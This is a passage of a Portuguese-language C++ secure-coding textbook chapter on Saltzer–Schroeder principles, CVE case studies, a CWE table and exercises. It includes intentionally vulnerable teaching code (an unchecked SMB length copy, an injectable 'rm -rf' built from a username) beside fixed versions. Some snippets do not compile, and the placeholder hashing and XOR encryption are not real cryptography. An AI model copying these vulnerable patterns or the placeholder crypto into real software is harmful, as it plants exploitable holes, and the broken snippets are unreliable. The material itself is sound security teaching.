        if (it == cache_.end()) {
            return false;
        }

        // COMPLETE MEDIATION: check expiry
        if (std::chrono::system_clock::now() > it->second.expiry) {
            cache_.erase(it);
            return false;
        }

        // COMPLETE MEDIATION: check failed attempts
        if (it->second.failed_attempts >= 5) {
            std::cout << "Account locked for " << username << "\n";
            return false;
        }

        bool valid = (it->second.password_hash == hashPassword(password));
        if (!valid) {
            it->second.failed_attempts++;
        } else {
            it->second.failed_attempts = 0;
        }

        return valid;
    }

    void cacheCredential(const std::string& username,
                         const std::string& password) {
        cache_[username] = {
            hashPassword(password),
            std::chrono::system_clock::now() +
                std::chrono::minutes(15),
            0
        };
    }

private:
    std::unordered_map<std::string, CachedCredential> cache_;

    std::string hashPassword(const std::string& pw) {
        return "hash_" + pw;
    }
};
```

### 6.4 CVE: EternalBlue (CVE-2017-0144) — Violação de Mediação Completa

**Descrição**: O EternalBlue explorou uma vulnerabilidade no protocolo SMBv1 do Microsoft Windows. O bug estava na validação de pacotes SMB: o Windows validava o tamaño de uma requisição em um ponto, mas executava operações de memória em outro ponto usando um valor diferente, sem re-validar.

**Princípio violado**: Mediação completa — a validação do pacote SMB não era realizada em todos os pontos de acesso ao recurso. O código confiava em um valor calculado em um momento e o reutilizava em outro sem re-verificação.

```cpp
#include <cstdint>
#include <cstring>
#include <vector>
#include <iostream>
#include <stdexcept>

struct SMBHeader {
    uint32_t signature;
    uint16_t status;
    uint16_t command;
    uint32_t data_length;
};

// Vulnerable SMB packet processing
class VulnerableSMBProcessor {
public:
    std::vector<uint8_t> processPacket(const uint8_t* packet,
                                       size_t length) {
        if (length < sizeof(SMBHeader)) {
            return {};
        }

        SMBHeader header;
        std::memcpy(&header, packet, sizeof(SMBHeader));

        // Validation done here...

        // BUG: Using header.data_length without re-validating
        // against actual remaining length. An attacker can
        // craft a packet where data_length > actual data,
        // causing out-of-bounds read.
        const uint8_t* data = packet + sizeof(SMBHeader);
        size_t data_len = header.data_length;

        // No check: data_len <= (length - sizeof(SMBHeader))
        std::vector<uint8_t> response(data_len);
        std::memcpy(response.data(), data, data_len);
        return response;
    }
};
```

**Versão corrigida**:

```cpp
#include <cstdint>
#include <cstring>
#include <vector>
#include <iostream>
#include <stdexcept>

struct SecureSMBHeader {
    uint32_t signature;
    uint16_t status;
    uint16_t command;
    uint32_t data_length;
};

class SecureSMBProcessor {
public:
    std::vector<uint8_t> processPacket(const uint8_t* packet,
                                       size_t length) {
        if (length < sizeof(SecureSMBHeader)) {
            throw std::runtime_error("Packet too short");
        }

        SecureSMBHeader header;
        std::memcpy(&header, packet, sizeof(SecureSMBHeader));

        // COMPLETE MEDIATION: validate data_length at every
        // point of use
        size_t available = length - sizeof(SecureSMBHeader);

        // Validate at the point of first use
        if (header.data_length > available) {
            throw std::runtime_error(
                "Declared data_length exceeds available data");
        }

        // Validate AGAIN at point of access
        const uint8_t* data = packet + sizeof(SecureSMBHeader);
        size_t data_len = header.data_length;

        // Triple-check: this must not exceed remaining buffer
        if (data + data_len > packet + length) {
            throw std::runtime_error("Buffer overflow prevented");
        }

        std::vector<uint8_t> response(data, data + data_len);
        return response;
    }
};
```

---

## 7. Design Aberto (Open Design)

### 7.1 Definição

O princípio de design aberto, também conhecido como Princípio de Kerckhoffs, afirma que a segurança de um sistema não deve depender da obscuridade do seu mecanismo. O sistema deve ser seguro mesmo quando totalmente conhecido pelo atacante. A segurança deve residir exclusivamente na chave secreta.

### 7.2 Algoritmo Secreto vs Chave Secreta

```cpp
#include <string>
#include <iostream>

// BAD: Security through obscurity
class SecretAlgorithm {
public:
    std::string encrypt(const std::string& plaintext) {
        // Secret, undocumented algorithm
        // If reversed-engineered, ALL communications are compromised
        std::string result;
        for (size_t i = 0; i < plaintext.size(); ++i) {
            result += static_cast<char>(
                plaintext[i] ^ ((i * 7 + 3) % 256));
            result += static_cast<char>(
                (plaintext[i] >> 2) | 0x80);
        }
        return result;
    }

    std::string decrypt(const std::string& ciphertext) {
        std::string result;
        for (size_t i = 0; i < ciphertext.size(); i += 2) {
            result += static_cast<char>(
                ciphertext[i] ^ (((i / 2) * 7 + 3) % 256));
        }
        return result;
    }
};

// GOOD: Well-known algorithm, secret key
class OpenDesignEncryption {
public:
    explicit OpenDesignEncryption(const std::string& key)
        : key_(key) {}

    // Using XOR as demonstration only - real code should use AES
    std::string encrypt(const std::string& plaintext) const {
        std::string result = plaintext;
        for (size_t i = 0; i < result.size(); ++i) {
            result[i] ^= key_[i % key_.size()];
        }
        return result;
    }

    std::string decrypt(const std::string& ciphertext) const {
        std::string result = ciphertext;
        for (size_t i = 0; i < result.size(); ++i) {
            result[i] ^= key_[i % key_.size()];
        }
        return result;
    }

    // Algorithm is public and well-documented
    // Security depends ONLY on key secrecy
    // If key is compromised, only that key is affected
    // Rotating keys is straightforward

private:
    std::string key_;
};
```

### 7.3 Princípios Aplicados

Design aberto significa:
- Usar algoritmos criptográficos padrão (AES, RSA, ChaCha20)
- Publicar protocolos de segurança para revisão da comunidade
- Não depender de sigilo de implementação para segurança
- Permitir auditoria independente do código

```cpp
// Public protocol documentation
struct SecurityProtocol {
    static constexpr const char* NAME = "SecureTransfer v2.0";
    static constexpr const char* CIPHER = "AES-256-GCM";
    static constexpr const char* KDF = "Argon2id";
    static constexpr const char* MAC = "HMAC-SHA256";

    // The protocol is public. Security depends on:
    // 1. Key secrecy (not protocol secrecy)
    // 2. Correct implementation of known algorithms
    // 3. Proper key management
};
```

---

## 8. Aceitação Psicológica (Psychological Acceptability)

### 8.1 Definição

Segurança deve ser fácil de usar corretamente e difícil de usar incorretamente. Se a API segura for mais trabalhosa que a insegura, os desenvolvedores escolherão a insegura. A segurança deve ser a rota de menor resistência.

### 8.2 API B vs API Ruim para Criptografia

```cpp
#include <string>
#include <iostream>
#include <stdexcept>
#include <memory>

// BAD API: Easy to misuse, hard to use correctly
class BadCryptoAPI {
public:
    // Developer must remember correct order of parameters
    // Developer must manage key lifecycle manually
    // Developer must choose algorithm (and might choose wrong)
    // Developer must handle IV/nonce (and might reuse)
    std::string encrypt(const char* algorithm,
                        const char* key_hex,
                        const char* iv_hex,
                        const char* plaintext,
                        bool use_padding,
                        int mode) {
        // So many parameters, so many ways to fail:
        // - Wrong algorithm name → runtime error
        // - Reuse IV → catastrophic security failure
        // - Wrong mode → insecure operation
        // - Manual padding → padding oracle attacks
        return std::string(plaintext);
    }
};

// GOOD API: Secure by default, hard to misuse
class GoodCryptoAPI {
public:
    struct EncryptedData {
        std::string ciphertext;
        std::string nonce;
        std::string tag;
    };

    explicit GoodCryptoAPI(const std::string& master_key) {
        if (master_key.size() < 32) {
            throw std::stdexcept(
                "Key must be at least 256 bits");
        }
        key_ = master_key;
    }

    EncryptedData encrypt(const std::string& plaintext) {
        // Nonce is automatically generated - can't be reused
        std::string nonce = generateNonce();

        // Always uses authenticated encryption (AES-256-GCM)
        // Developer cannot choose insecure mode
        std::string ciphertext = encryptAES(plaintext, nonce);

        // Tag is automatically computed
        std::string tag = computeTag(ciphertext, nonce);

        return {ciphertext, nonce, tag};
    }

    std::string decrypt(const EncryptedData& data) {
        // Automatically verifies tag before decrypting
        // Cannot accidentally skip authentication
        if (!verifyTag(data.ciphertext, data.nonce, data.tag)) {
            throw std::runtime_error(
                "Authentication failed - data tampered");
        }
        return decryptAES(data.ciphertext, data.nonce);
    }

    // No way to:
    // - Choose wrong algorithm (only AES-256-GCM available)
    // - Reuse nonce (auto-generated)
    // - Skip authentication (tag always computed)
    // - Use wrong mode (only authenticated encryption)

private:
    std::string key_;

    std::string generateNonce() {
        return "random_nonce_12_bytes";
    }

    std::string encryptAES(const std::string& data,
                           const std::string& nonce) {
        return "encrypted_" + data;
    }

    std::string decryptAES(const std::string& data,
                           const std::string& nonce) {
        return data.substr(10);
    }

    std::string computeTag(const std::string& data,
                           const std::string& nonce) {
        return "tag_" + data.substr(0, 8);
    }

    bool verifyTag(const std::string& data,
                   const std::string& nonce,
                   const std::string& tag) {
        return tag == computeTag(data, nonce);
    }
};

void demonstrateGoodAPI() {
    GoodCryptoAPI crypto("0123456789abcdef0123456789abcdef");

    auto encrypted = crypto.encrypt("sensitive data");
    std::cout << "Encrypted: " << encrypted.ciphertext << "\n";

    std::string decrypted = crypto.decrypt(encrypted);
    std::cout << "Decrypted: " << decrypted << "\n";
}
```

### 8.3 Princípios de API Segura

1. **Previna erros em tempo de compilação**: Use tipos que impossibilitem uso incorreto.
2. **Defaults seguros**: A opção mais fácil deve ser a mais segura.
3. **Elimine configurações perigosas**: Se algo é sempre errado, não permita.
4. **Forneça feedback claro**: Erros devem ser compreensíveis e acionáveis.

```cpp
#include <type_traits>
#include <string>

// Type-safe key management
template<typename Purpose>
class TypedKey {
public:
    explicit TypedKey(std::string key) : key_(std::move(key)) {}
    const std::string& get() const { return key_; }
private:
    std::string key_;
};

struct EncryptionPurpose {};
struct SigningPurpose {};
struct HashingPurpose {};

// Keys have purpose baked into their type
// You CANNOT accidentally use a signing key for encryption
// Compiler enforces correct usage
using EncryptionKey = TypedKey<EncryptionPurpose>;
using SigningKey = TypedKey<SigningPurpose>;

class TypeSafeCrypto {
public:
    std::string encrypt(const EncryptionKey& key,
                        const std::string& data) {
        return "encrypted_" + data;
    }

    std::string sign(const SigningKey& key,
                     const std::string& data) {
        return "signed_" + data;
    }
};
```

---

## 9. Zero Trust no Código

### 9.1 Definição

Zero Trust é o princípio de que NENHUM componente deve ser confiado por padrão — nem interno, nem externo, nem de rede local, nem de bibliotecas de terceiros. Toda entrada, toda comunicação e toda operação deve ser verificada.

### 9.2 Validação de Entrada como Padrão Zero Trust

```cpp
#include <string>
#include <vector>
#include <memory>
#include <iostream>
#include <functional>
#include <stdexcept>

class InputSanitizer {
public:
    static std::string sanitize(const std::string& input) {
        std::string result;
        result.reserve(input.size());

        for (char c : input) {
            switch (c) {
                case '<':  result += "&lt;";   break;
                case '>':  result += "&gt;";   break;
                case '&':  result += "&amp;";  break;
                case '"':  result += "&quot;"; break;
                case '\'': result += "&#x27;"; break;
                case '/':  result += "&#x2F;"; break;
                default:
                    if (std::isprint(static_cast<unsigned char>(c))) {
                        result += c;
                    }
                    break;
            }
        }
        return result;
    }

    static bool isValidIdentifier(const std::string& input) {
        if (input.empty() || input.size() > 128) return false;
        if (!std::isalpha(static_cast<unsigned char>(input[0])) &&
            input[0] != '_') {
            return false;
        }
        return std::all_of(input.begin(), input.end(),
            [](char c) {
                return std::isalnum(static_cast<unsigned char>(c)) ||
                       c == '_';
            });
    }

    static bool isValidPath(const std::string& path) {
        if (path.empty() || path.size() > 1024) return false;
        if (path.find("..") != std::string::npos) return false;
        if (path.find('\0') != std::string::npos) return false;
        if (path[0] != '/') return false;
        return true;
    }
};

class ZeroTrustService {
public:
    struct Request {
        std::string user_id;
        std::string action;
        std::string resource;
        std::string data;
    };

    struct Response {
        bool success;
        std::string message;
    };

    Response handleRequest(const Request& req) {
        // Trust nothing, verify everything

        // Verify user_id
        if (!InputSanitizer::isValidIdentifier(req.user_id)) {
            return {false, "Invalid user_id"};
        }

        // Verify action
        if (!isAllowedAction(req.action)) {
            return {false, "Invalid action"};
        }

        // Verify resource path
        if (!InputSanitizer::isValidPath(req.resource)) {
            return {false, "Invalid resource path"};
        }

        // Verify data
        if (req.data.size() > 1048576) {
            return {false, "Data too large"};
        }

        // Authenticate
        if (!authenticateUser(req.user_id)) {
            return {false, "Authentication failed"};
        }

        // Authorize
        if (!authorizeAction(req.user_id, req.action,
                            req.resource)) {
            return {false, "Authorization failed"};
        }

        // Execute with sanitized data
        std::string safe_data =
            InputSanitizer::sanitize(req.data);

        return {true, "Request processed: " + safe_data};
    }

private:
    bool isAllowedAction(const std::string& action) {
        static const std::vector<std::string> allowed = {
            "read", "write", "list"
        };
        return std::find(allowed.begin(), allowed.end(), action)
               != allowed.end();
    }

    bool authenticateUser(const std::string& user_id) {
        return !user_id.empty();
    }

    bool authorizeAction(const std::string& user_id,
                        const std::string& action,
                        const std::string& resource) {
        return true;
    }
};
```

### 9.3 Isolamento de Componentes

```cpp
#include <string>
#include <memory>
#include <iostream>
#include <functional>

class ComponentBoundary {
public:
    ComponentBoundary(const std::string& name) : name_(name) {}

    std::string invoke(const std::string& input) {
        logAccess(name_, input);
        std::string validated = validateInput(input);
        return process(validated);
    }

private:
    std::string name_;

    void logAccess(const std::string& component,
                   const std::string& input) {
        std::cout << "[ZERO-TRUST] " << component
                  << " received: " << input << "\n";
    }

    std::string validateInput(const std::string& input) {
        if (input.size() > 4096) {
            throw std::runtime_error("Input too large");
        }
        return input;
    }

    std::string process(const std::string& input) {
        return "processed by " + name_ + ": " + input;
    }
};

class MicrosegmentedService {
public:
    MicroSegmentedService()
        : auth_boundary_("AuthService"),
          data_boundary_("DataService"),
          logic_boundary_("LogicService") {}

    std::string handleRequest(const std::string& raw_request) {
        // Each component independently validates input
        // No component trusts another's output
        std::string auth_result =
            auth_boundary_.invoke(raw_request);
        std::string data_result =
            data_boundary_.invoke(auth_result);
        return logic_boundary_.invoke(data_result);
    }

private:
    ComponentBoundary auth_boundary_;
    ComponentBoundary data_boundary_;
    ComponentBoundary logic_boundary_;
};
```

---

## 10. Princípios Adicionais

### 10.1 Fator de Trabalho (Work Factor)

O fator de trabalho define o esforço necessário para quebrar um mecanismo de segurança. Se o custo de quebrar excede o valor do alvo, o mecanismo é adequado.

```cpp
#include <string>
#include <chrono>
#include <iostream>

class WorkFactorEstimator {
public:
    struct Estimate {
        double keyspace_size;
        double operations_per_second;
        double seconds_to_break;
        bool isPractical;
    };

    static Estimate estimateSymmetricKey(int key_bits,
        double ops_per_sec = 1e9) {
        double keyspace = std::pow(2.0, key_bits);
        double seconds = keyspace / ops_per_sec / 2.0;

        return {
            keyspace,
            ops_per_sec,
            seconds,
            seconds < 31536000.0 // less than 1 year
        };
    }

    static void printEstimate(const std::string& name,
                              const Estimate& e) {
        double years = e.seconds_to_break / 31536000.0;
        std::cout << name << ":\n"
                  << "  Keyspace: " << e.keyspace_size << "\n"
                  << "  Ops/sec: " << e.operations_per_second << "\n"
                  << "  Time to break: " << years << " years\n"
                  << "  Practical: "
                  << (e.isPractical ? "YES (INSECURE)" : "NO (SECURE)")
                  << "\n";
    }
};
```

### 10.2 Registro de Comprometimento (Compromise Recording)

```cpp
#include <string>
#include <vector>
#include <chrono>
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>

class TamperEvidentLog {
public:
    struct LogEntry {
        uint64_t sequence;
        std::string timestamp;
        std::string event;
        std::string prev_hash;
        std::string hash;
    };

    void record(const std::string& event) {
        LogEntry entry;
        entry.sequence = entries_.size();
        entry.timestamp = getCurrentTimestamp();
        entry.event = event;
        entry.prev_hash = entries_.empty() ? "0" :
                          entries_.back().hash;
        entry.hash = computeHash(entry);
        entries_.push_back(entry);
    }

    bool verifyIntegrity() const {
        for (size_t i = 1; i < entries_.size(); ++i) {
            if (entries_[i].prev_hash != entries_[i-1].hash) {
                std::cout << "TAMPER DETECTED at entry "
                          << i << "\n";
                return false;
            }
        }
        return true;
    }

    void printLog() const {
        for (const auto& entry : entries_) {
            std::cout << "[" << entry.sequence << "] "
                      << entry.timestamp << " "
                      << entry.event << " (hash: "
                      << entry.hash.substr(0, 8) << ")\n";
        }
    }

private:
    std::vector<LogEntry> entries_;

    std::string getCurrentTimestamp() const {
        auto now = std::chrono::system_clock::now();
        auto time = std::chrono::system_clock::to_time_t(now);
        std::ostringstream oss;
        oss << std::put_time(std::localtime(&time),
                             "%Y-%m-%dT%H:%M:%S");
        return oss.str();
    }

    std::string computeHash(const LogEntry& entry) const {
        std::ostringstream data;
        data << entry.sequence << entry.timestamp
             << entry.event << entry.prev_hash;
        std::string raw = data.str();

        // Simplified hash - real code should use SHA-256
        uint64_t hash = 14695981039346656037ULL;
        for (char c : raw) {
            hash ^= static_cast<uint64_t>(c);
            hash *= 1099511628211ULL;
        }

        std::ostringstream hash_oss;
        hash_oss << std::hex << std::setw(16)
                 << std::setfill('0') << hash;
        return hash_oss.str();
    }
};
```

### 10.3 Ring of Steel / Menor Surpresa (Least Astonishment)

```cpp
#include <string>
#include <iostream>
#include <stdexcept>

class SecureString {
public:
    explicit SecureString(std::string value)
        : value_(std::move(value)) {}

    ~SecureString() {
        // Securely wipe memory on destruction
        if (!value_.empty()) {
            volatile char* p =
                reinterpret_cast<volatile char*>(&value_[0]);
            for (size_t i = 0; i < value_.size(); ++i) {
                p[i] = 0;
            }
        }
    }

    // No copy - secrets should not be duplicated
    SecureString(const SecureString&) = delete;
    SecureString& operator=(const SecureString&) = delete;

    // Move is allowed
    SecureString(SecureString&& other) noexcept
        : value_(std::move(other.value_)) {}

    bool empty() const { return value_.empty(); }
    size_t size() const { return value_.size(); }

    // SecureString should NOT have a c_str() or data() method
    // that exposes the raw value easily - this is "least astonishment"
    // for security: making accidental exposure harder

    // Comparison should be constant-time to prevent timing attacks
    bool operator==(const SecureString& other) const {
        if (value_.size() != other.value_.size()) return false;
        volatile unsigned char result = 0;
        for (size_t i = 0; i < value_.size(); ++i) {
            result |= static_cast<unsigned char>(
                value_[i] ^ other.value_[i]);
        }
        return result == 0;
    }

    // Intentionally NOT implementing:
    // - operator<< (prevents accidental logging)
    // - toString() (prevents accidental exposure)
    // - hash<> (prevents accidental use in hash maps)

private:
    std::string value_;
};
```

---

## 11. Tabela de Referência: Principios x CWE x CVEs

A tabela abaixo mapeia cada princípio de segurança a suas classificações CWE correspondentes e CVEs históricas que demonstram a violação.

| Princípio | CWE Principal | CVE Exemplo | Descrição da Falha |
|---|---|---|---|
| Menor Privilégio | CWE-250, CWE-269 | CVE-2021-44228 (Log4Shell) | Logger com capacidades JNDI excessivas |
| Defesa em Profundidade | CWE-693 | Equifax (2017) | Ausência de segmentação e patch management |
| Fail-Safe Defaults | CWE-284, CWE-285 | CVE-2014-0160 (Heartbleed) | Buffer read sem validação de tamanho |
| Separação de Deveres | CWE-841 | Stuxnet (2010) | Controle SCADA sem separação de funções |
| Economia de Mecanismo | CWE-710 | CVE-2014-6271 (Shellshock) | Expansão de variáveis de ambiente excessivamente complexa |
| Mediação Completa | CWE-367, CWE-502 | CVE-2017-0144 (EternalBlue) | Validação SMB não realizada em todos os pontos |
| Design Aberto | CWE-327 | SolarWinds (2020) | Dependência de obscuridade de componentes internos |
| Aceitação Psicológica | CWE-693, CWE-710 | Diversos | APIs de segurança complexas e propensas a erro |
| Zero Trust | CWE-20, CWE-284 | Múltiplos | Confiança implícita em componentes internos |

### CWE Detalhado

| CWE | Nome | Descrição | Princípio Relacionado |
|---|---|---|---|
| CWE-20 | Improper Input Validation | Entrada não validada antes de processamento | Zero Trust |
| CWE-250 | Execution with Unnecessary Privileges | Processo roda com mais privilégios que necessário | Menor Privilégio |
| CWE-269 | Improper Privilege Management | Gestão incorreta de privilégios | Menor Privilégio |
| CWE-284 | Improper Access Control | Controle de acesso inadequado | Fail-Safe Defaults |
| CWE-285 | Improper Authorization | Autorização inadequada | Fail-Safe Defaults |
| CWE-327 | Use of Broken Cryptographic Algorithm | Uso de algoritmo criptográfico comprometido | Design Aberto |
| CWE-367 | TOCTOU Race Condition | Condição de corrida entre verificação e uso | Mediação Completa |
| CWE-502 | Deserialization of Untrusted Data | Deserialização de dados não confiáveis | Zero Trust |
| CWE-693 | Protection Mechanism Failure | Falha no mecanismo de proteção | Defesa em Profundidade |
| CWE-710 | Improper Adherence to Coding Standards | Não aderência a padrões de codificação segura | Economia de Mecanismo |
| CWE-841 | Improper Enforcement of Behavioral Workflow | Falha na separação de fluxos de trabalho | Separação de Deveres |

---

## 12. Referências

### 12.1 Literatura Fundamental

- **Saltzer, J. H., & Schroeder, M. D. (1975).** "The Protection of Information in Computer Systems." *Proceedings of the IEEE*, 63(9), 1278-1308. O artigo seminal que estabeleceu os oito princípios de segurança de software descritos neste capítulo.

- **Anderson, J. P. (1972).** *Computer Security Technology Planning Study.* ESD-TR-73-51, U.S. Air Force. O primeiro framework formal de segurança computacional.

- **Bishop, M. (2003).** *Computer Security: Art and Science.* Addison-Wesley. Referência abrangente para princípios de segurança aplicados.

- **Viega, J., & McGraw, G. (2001).** *Building Secure Software: How to Avoid Security Holes the Right Way.* Addison-Wesley. Aplicação prática dos princípios em desenvolvimento de software.

### 12.2 CVEs e Análises

- **Heartbleed:** CVE-2014-0160. Dorwin, M. (2014). "TLS Heartbeat Extension Memory Leak." *OpenSSL Security Advisory.*

- **Shellshock:** CVE-2014-6271. Chet Ramey (2014). "Bash/Remote Code Execution." *GNU Bash Documentation.*

- **EternalBlue:** CVE-2017-0144. Microsoft Security Bulletin MS17-010. (2017). "Security Update for Microsoft Windows SMB Server."

- **Log4Shell:** CVE-2021-44228. Apache Foundation (2021). "Apache Log4j Security Advisory."

- **Stuxnet:** Langner, R. (2013). *To Kill a Centrifuge: A Technical Analysis of What Stuxnet's Creators Tried to Achieve.* The Langner Group.

- **SolarWinds:** FireEye (2020). "Highly Evasive Attacker Leverages SolarWinds Supply Chain."

### 12.3 Normas e Padrões

- **NIST SP 800-53 Rev. 5.** "Security and Privacy Controls for Information Systems and Organizations."
- **OWASP Top 10 (2021).** "Top 10 Web Application Security Risks."
- **CERT C Coding Standard.** SEI CERT. "Secure C/C++ Coding Standard."
- **CWE/SANS Top 25.** "Most Dangerous Software Weaknesses."

### 12.4 Ferramentas de Análise

- **Clang Static Analyzer:** Análise estática para detecção de vulnerabilidades em C/C++.
- **AddressSanitizer (ASan):** Detector de erros de memória em tempo de execução.
- **Valgrind:** Framework de análise de memória para detectar leaks e acessos inválidos.
- **Cppcheck:** Análise estática para detectar bugs em C/C++.
- **Bandit:** Análise estática para padrões inseguros (Python, mas conceitos aplicáveis).

---

## Resumo

Os princípios de codificação segura não são teoria abstrata — são lições extraídas de décadas de falhas reais. Cada CVE discutido neste capítulo demonstra uma violação específica e seu custo mensurável:

- **Heartbleed** mostrou que confiar no tamanho declarado pelo cliente causa vazamento de memória em massa.
- **Log4Shell** demonstrou que conceder capacidades excessivas a componentes de log abre vetores de RCE.
- **Shellshock** provou que mecanismos complexos de expansão escondem vulnerabilidades críticas.
- **EternalBlue** revelou que validação incompleta em protocolos de rede permite exploração remota.
- **Stuxnet** ilustrou que a ausência de separação de deveres permite sabotagem de sistemas críticos.
- **SolarWinds** demonstrou que confiar cegamente em componentes de supply chain compromete todo o ecossistema.

A aplicação consistente desses princípios em código C++17 — utilizando RAII para gerenciamento de recursos, typesafety para prevenir erros, e design que fail-safe — transforma a segurança de uma aspiração em uma propriedade verificável do software.

Cada princípulo trabalha em conjunto com os outros. Menor privilégio complementa defesa em profundidade. Economia de mecanismo torna mediação completa verificável. Design aberto permite que aceitação psicológica seja validada pela comunidade. E Zero Trust fundamenta todos os demais.

A segurança não é um feature que se adiciona no final. É uma propriedade emergente de código construído com disciplina, princípios e respeito pelas lições que o passado nos ensinou.

---

## Exercícios

1. **Implementação RAII**: Crie uma classe `ScopedFileLock` que adquira um bloqueio exclusivo em um arquivo usando `flock()` e o libere automaticamente no destrutor. Inclua suporte a move semantics e delete de copy.

2. **Análise de CVE**: Identifique em qual(is) princípio(s) a CVE-2021-22205 (GitLab RCE via ExifTool) violou. Escreva o padrão de código vulnerável e sua correção.

3. **API Design**: Projete uma API C++ para geração de senhas aleatórias que implemente aceitação psicológica. A API deve impossibilir: uso de RNG inseguro, comprimento insuficiente, e exposição do estado interno.

4. **Zero Trust**: Implemente um validador de entrada que aplique o princípio Zero Trust em cada campo de uma estrutura `UserRegistration` (nome, email, idade, senha). Cada campo deve ter suas próprias regras de validação independentes.

5. **Mediação Completa**: Identifique e corrija TODAS as vulnerabilidades TOCTOU no seguinte código:

```cpp
void deleteUser(const std::string& username) {
    if (userExists(username)) {        // Check 1
        std::string path = "/home/" + username;
        if (isOwnedByCurrentUser(path)) {  // Check 2
            // Between Check 2 and the rm call,
            // the path could have been replaced
            system(("rm -rf " + path).c_str());
        }
    }
}
```
---

*[Capítulo anterior: 02 — Ciclo De Vida Seguro](02-ciclo-de-vida-seguro.md)*
*[Próximo capítulo: 04 — Seguranca De Memoria Em Cpp](04-seguranca-de-memoria-em-cpp.md)*
